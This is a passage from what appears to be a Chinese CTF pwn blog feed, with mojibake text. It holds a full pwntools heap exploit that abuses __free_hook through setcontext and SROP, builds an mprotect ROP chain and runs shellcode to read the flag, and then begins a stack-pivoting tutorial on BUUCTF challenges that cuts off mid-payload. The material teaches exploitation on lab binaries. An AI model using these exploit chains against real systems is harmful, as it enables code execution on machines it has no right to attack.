aS4cur1tyP4ssw0, v1);</span><br><span class="line">    sub_1152(&amp;unk_203180, v5, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input the value: &quot;</span>);</span><br><span class="line">    sub_EE7(<span class="number">0</span>, v5, v4);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Encrypt and save value...&quot;</span>);</span><br><span class="line">    v2 = <span class="built_in">strlen</span>(aS4cur1tyP4ssw0);</span><br><span class="line">    sub_F98(&amp;unk_203180, aS4cur1tyP4ssw0, v2);</span><br><span class="line">    sub_1152(&amp;unk_203180, v5, v4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="æ³„éœ²libc"><a href="#æ³„éœ²libc" class="headerlink" title="æ³„éœ²libc"></a>æ³„éœ²libc</h3><ul><li>æ³„éœ²libcå…¶å®å¾ˆç®€å•ï¼Œç»™tcacheå¡«æ»¡ç„¶åå†æ¬¡freeçš„å°±è¿›å…¥åˆ°unsortedbinä¸­äº†</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">rc4key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">sla(<span class="string">&quot;Input your username:\n&quot;</span>, <span class="string">&#x27;4dm1n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your password:\n&quot;</span>, <span class="string">&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(rc4_crypt(rc(<span class="number">8</span>)).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br></pre></td></tr></table></figure></div><ul><li><code>uaf</code>ä¿®æ”¹<code>free_hook</code>ä¸º<code>setcontext+53</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, rc4_crypt(p64(free_hook)))</span><br></pre></td></tr></table></figure></div><ul><li>ä¿®æ”¹<code>free_hook</code>ä¸º<code>setcontext+53</code>ï¼Œæ‰§è¡Œ<code>&#39;srop&#39;</code></li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rip = read</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, rc4_crypt(p64(setcontext)))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></div><ul><li>æœ€åæ‰§è¡Œ<code>mprotext</code>æ”¹æ®µä¸ºrwxæƒé™</li></ul><p><mark>æ”¹çš„æ˜¯<code>free_hookçš„é‚£ä¸€é¡µä¸ºrwx</code>ï¼Œå¯ä»¥çœ‹ä¸‹é¢æ˜¯å¦‚ä½•å®ç°çš„</mark></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rdx_rsi_ret = libc.address + <span class="number">0x130539</span></span><br><span class="line">rdi_ret = libc.address + <span class="number">0x2164f</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(rdi_ret, free_hook &amp; ~<span class="number">0xfff</span>, rdx_rsi_ret, <span class="number">7</span>, <span class="number">0x1000</span>, mprotect, free_hook + <span class="number">0x38</span>)</span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div><p><code>free_hook &amp; ~0xfff</code>è¿™å¯ä»¥å¾—åˆ°0xâ€¦â€¦.000ï¼Œå³æ”¹free_hookçš„æœ«ä¸‰ä½ä¸º0ï¼Œä¹Ÿå°±ç¬¦åˆé¡µå¯¹å…¶äº†</p><p><mark>ä¸ºä»€ä¹ˆä¸€ä¸ªpayloadå°±å¯ä»¥è¾¾åˆ°get flagäº†?<mark></mark></mark></p><ul><li>frameä¸­ripæŒ‡å‘readï¼Œæ­¤æ—¶ä¼šæ‰§è¡Œ<code>call reap</code>ï¼Œcallçš„æ—¶å€™ä¼šæ‰§è¡Œ<code>push rip</code>ï¼Œæ­¤æ—¶çš„ripä¾¿æŒ‡å‘<code>free_hook</code>çš„ä½ç½®ï¼Œç„¶åropé“¾å¸ƒç½®åœ¨<code>free_hook</code>ï¼Œåœ¨æ‰§è¡Œå®Œreadï¼Œä¹‹åä¼šæ‰§è¡Œ<code>ret</code>å³<code>pop rip</code>ï¼Œä¹Ÿå°±æ‰§è¡Œropé“¾äº†</li></ul><h2 id="å®Œæ•´EXP"><a href="#å®Œæ•´EXP" class="headerlink" title="å®Œæ•´EXP"></a>å®Œæ•´EXP</h2><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">c = <span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span>(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>():</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_sb</span>():</span><br><span class="line">    <span class="keyword">return</span> libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>], libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru  = <span class="keyword">lambda</span> text   :p.recvuntil(text)</span><br><span class="line">rl  = <span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">ia   = <span class="keyword">lambda</span>        :p.interactive()</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line">lg= <span class="keyword">lambda</span> s, num   :p.success(<span class="string">&#x27;%s -&gt; 0x%x&#x27;</span> % (s, num))</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">&quot;amd64&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,log_level = <span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>, <span class="string">&#x27;-x&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line">file = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">libc = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">cmd = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = gdb.debug(file, cmd)</span></span><br><span class="line">p = process(file)</span><br><span class="line">elf = ELF(file)</span><br><span class="line">libc = ELF(libc)</span><br><span class="line"><span class="comment">#p = remote(&quot;0192d669a7597e02a58fb5410dfb2dd1.d1eq.dg05.ciihw.cn&quot;, 43580)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&quot;5. Exit\n&gt; \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, cont=<span class="string">&#x27;a&#x27;</span></span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;the value size: \n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    ru(<span class="string">&quot;the value: \n&quot;</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;The result is:\n\t[key,value] = [&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;,&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, cont</span>):</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;the key: \n&quot;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    ru(<span class="string">&quot;the value: \n&quot;</span>)</span><br><span class="line">    sl(cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_crypt</span>(<span class="params">data</span>):</span><br><span class="line">    enc = ARC4.new(rc4key)</span><br><span class="line">    <span class="keyword">return</span> enc.decrypt(data)</span><br><span class="line"></span><br><span class="line">rc4key = <span class="string">b&quot;s4cur1ty_p4ssw0rd&quot;</span></span><br><span class="line">sla(<span class="string">&quot;Input your username:\n&quot;</span>, <span class="string">&#x27;4dm1n&#x27;</span>)</span><br><span class="line">sla(<span class="string">&quot;Input your password:\n&quot;</span>, <span class="string">&#x27;985da4f8cb37zkj&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(i, <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc.address = u64(rc4_crypt(rc(<span class="number">8</span>)).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x3ebca0</span></span><br><span class="line">setcontext = libc.sym[<span class="string">&quot;setcontext&quot;</span>] + <span class="number">53</span></span><br><span class="line">free_hook = libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line"></span><br><span class="line">lg(<span class="string">&quot;libc&quot;</span>, libc.address)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, rc4_crypt(p64(free_hook)))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rsp = free_hook</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = free_hook</span><br><span class="line">frame.rdx = <span class="number">0x300</span></span><br><span class="line">frame.rip = read</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x200</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x200</span>, rc4_crypt(p64(setcontext)))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">rdx_rsi_ret = libc.address + <span class="number">0x130539</span></span><br><span class="line">rdi_ret = libc.address + <span class="number">0x2164f</span></span><br><span class="line">mprotect = libc.sym[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = flat(rdi_ret, free_hook &amp; ~<span class="number">0xfff</span>, rdx_rsi_ret, <span class="number">7</span>, <span class="number">0x1000</span>, mprotect, free_hook + <span class="number">0x38</span>)</span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;flag&#x27;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="number">3</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, free_hook + <span class="number">0x300</span>, <span class="number">0x30</span>)</span><br><span class="line">payload += asm(shellcode)</span><br><span class="line"></span><br><span class="line">sl(payload)</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure></div>]]></content>
      
      
      
        <tags>
            
            <tag> ctf-pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ ˆè¿ç§»-Pivoting</title>
      <link href="/2024/10/23/%E6%A0%88%E8%BF%81%E7%A7%BB-Pivoting/"/>
      <url>/2024/10/23/%E6%A0%88%E8%BF%81%E7%A7%BB-Pivoting/</url>
      
        <content type="html"><![CDATA[<h1 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h1><p>æœ€åˆå­¦çš„æ—¶å€™çœ‹çš„æ–‡ç« :<a class="link" href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">this <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>æ ˆè¿ç§»ï¼šåœ¨äºæº¢å‡ºçš„é•¿åº¦ä¸å¤Ÿå¸ƒç½®ROPé“¾ï¼Œå¯ä»¥è¿ç§»æ ˆåˆ°ä¸€ä¸ªåˆé€‚çš„åœ°å€ï¼Œåˆé€‚çš„ç©ºé—´ï¼Œå¸ƒç½®ROPé“¾ï¼Œç„¶åæ‰§è¡ŒROPé“¾ï¼Œgetshellã€‚</p><h1 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a><mark>åŸç†<mark></mark></mark></h1><p>ä¿®æ”¹ret addressä¸ºleave retï¼Œå°†rbpä¿®æ”¹ä¸ºè¦è¿ç§»çš„åœ°å€ï¼Œå³å¯æ ˆè¿ç§»ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave ç›¸å½“äº mov rsp, rbp; pop rbp ;</span><br><span class="line">ret ç›¸å½“äº pop rip</span><br></pre></td></tr></table></figure></div><ul><li>ç¬¬ä¸€æ¬¡leave ret(å‡½æ•°ç»“å°¾ä¼šè‡ªå¸¦æ¥æ¢å¤æ ˆçŠ¶æ€)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leave: mov rsp,rbp; å°†rbpçš„å€¼ç»™rspï¼Œå³-å°†rspæ‹‰åˆ°rbpçš„ä½ç½®</span><br><span class="line">   pop rbp; å°†rspæ­¤æ—¶å¯¹åº”çš„å€¼å¼¹ç»™rbpï¼Œæ‰€ä»¥ä¹‹å‰å°†aim_addrè¦†ç›–ä¸ºrbpå°±æ˜¯ä¸ºäº†æ­¤æ—¶å°†rbpå¼¹ä¸ºaim_addr,å®Œæˆè¿™ä¸€æ­¥ï¼Œrbpè¿ç§»åˆ°aim address</span><br><span class="line">   ;åŒæ—¶ç”±äºpopï¼Œrspå¾€é«˜åœ°å€ç§»åŠ¨ä¸€ä¸ªæœºå™¨å­—é•¿,å³æ­¤æ—¶rspæ˜¯ret address</span><br><span class="line">ret :  pop rip;å°†rspæ­¤æ—¶çš„å€¼å¼¹ç»™ripï¼Œå³leave ret å¼¹ç»™ripï¼Œä¼šå†æ¬¡æ‰§è¡Œleave ret</span><br></pre></td></tr></table></figure></div><ul><li>ç¬¬äºŒæ¬¡leave ret(æº¢å‡ºret addr å¾—åˆ°çš„leave ret)</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">leave: ;rspåˆ°rbpçš„ä½ç½®ï¼Œå³aim_address</span><br><span class="line">pop rbp;å°†aim_addræ‰€æŒ‡å‘çš„æ•°æ®å¼¹ç»™rbpï¼Œè¿™é‡Œè¦æ³¨æ„ï¼ï¼ï¼æœ‰ä¸€ä¸ªå­—é•¿çš„åƒåœ¾æ•°æ®æ˜¯æ²¡ç”¨çš„ï¼Œæ­¤æ—¶çš„rbpæ— æ‰€è°“å¼¹åˆ°å“ªé‡Œï¼Œç„¶årspå‘é«˜åœ°å€ç§»åŠ¨</span><br><span class="line">ret: pop rip; rspæ­¤æ—¶åœ¨ROPé“¾çš„å¼€ç«¯ï¼Œç„¶åå¼¹ç»™ripå¼€å§‹æ‰§è¡ŒROPé“¾</span><br></pre></td></tr></table></figure></div><p><img lazyload src="/images/loading.svg" data-src="/../capture_20241023211519333-1738682315826-1.bmp"></p><ul><li>æ ¸å¿ƒçš„åŸç†å°±æ˜¯è¿™æ ·äº†</li></ul><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rbp -&gt; aim_address(å¸ƒç½®ä¸€ä¸ªåƒåœ¾æ•°æ®) or -&gt;aim_address-8</span><br><span class="line">ret address -&gt; leave ret </span><br></pre></td></tr></table></figure></div><h1 id="ä¾‹é¢˜"><a href="#ä¾‹é¢˜" class="headerlink" title="ä¾‹é¢˜"></a>ä¾‹é¢˜</h1><h1 id="BUUCTF-actf-2019-babystack"><a href="#BUUCTF-actf-2019-babystack" class="headerlink" title="BUUCTF actf_2019_babystack"></a>BUUCTF actf_2019_babystack</h1><p>ç›´æ¥çœ‹<a class="link" href="https://blog.csdn.net/zwb2603096342/article/details/139299524?spm=1001.2014.3001.5502">è¿™ç¯‡æ–‡ç«  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>ï¼Œå¾ˆä¹…ä¹‹å‰å†™çš„</p><ul><li>è¿™é“é¢˜ç›®å°±æ˜¯æ ‡å‡†çš„æ ˆè¿ç§»é¢˜ç›®ï¼Œä¹Ÿå¯ä»¥è¯´æ˜¯æ¿å­äº†ï¼Œåªå…è®¸ä½ æº¢å‡º0x10å­—èŠ‚ï¼Œåˆšå¥½å¤Ÿè¦†ç›–rbpï¼Œret_addressï¼Œå¯ä»¥æ‰“ä¸€æ¬¡æ ˆè¿ç§»ï¼Œæ³„éœ²å‡ºæ ˆåœ°å€ï¼Œé‡å¤ä½¿ç”¨</li><li>ä½†æ˜¯æ²¡æœ‰æ³„éœ²å‡ºæ ˆåœ°å€æ€ä¹ˆåŠå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥æ ˆè¿ç§»åˆ°bssæ®µä¸Š,è§ä¸‹é¢˜</li></ul><h1 id="BUUCTF-Black-watchå…¥ç¾¤é¢˜"><a href="#BUUCTF-Black-watchå…¥ç¾¤é¢˜" class="headerlink" title="BUUCTF Black watchå…¥ç¾¤é¢˜"></a>BUUCTF Black watchå…¥ç¾¤é¢˜</h1><p><a class="link" href="https://buuoj.cn/challenges#[Black%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98]PWN">é¢˜ç›®é“¾æ¥ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p><mark>32ä½<mark></mark></mark></p><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vul_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">24</span>]; <span class="comment">// [esp+0h] [ebp-18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">strlen</span>(m1);</span><br><span class="line">  write(<span class="number">1</span>, m1, v0);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x200</span>u);</span><br><span class="line">  v1 = <span class="built_in">strlen</span>(m2);</span><br><span class="line">  write(<span class="number">1</span>, m2, v1);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x20</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><ul><li>sæ˜¯åœ¨bssæ®µä¸Šçš„ï¼Œç„¶åä¸‹æ–¹å¾€bufè¯»å…¥æ•°æ®,åªèƒ½æº¢å‡ºä¸¤ä¸ªæœºå™¨å­—é•¿ï¼Œå…¸å‹çš„æ ˆè¿ç§»ï¼Œä½†æ˜¯è¿™é‡Œæ˜¯ä¸å¯ä»¥æ³„éœ²æ ˆåœ°å€çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•å®ç°æ ˆçš„å¤ç”¨ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥è¿ç§»åˆ°bssæ®µä¸Šå³å¯</li><li>åˆ†ä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ³„éœ²libcï¼Œç¬¬äºŒæ­¥get shell</li></ul><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¸ƒç½®ROPé“¾ï¼Œå‡†å¤‡æ³„æ¼libc</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;What is your name?&quot;</span>)</span><br><span class="line">payload = flat(write_plt,main,<span class="number">1</span>,write_got,<span 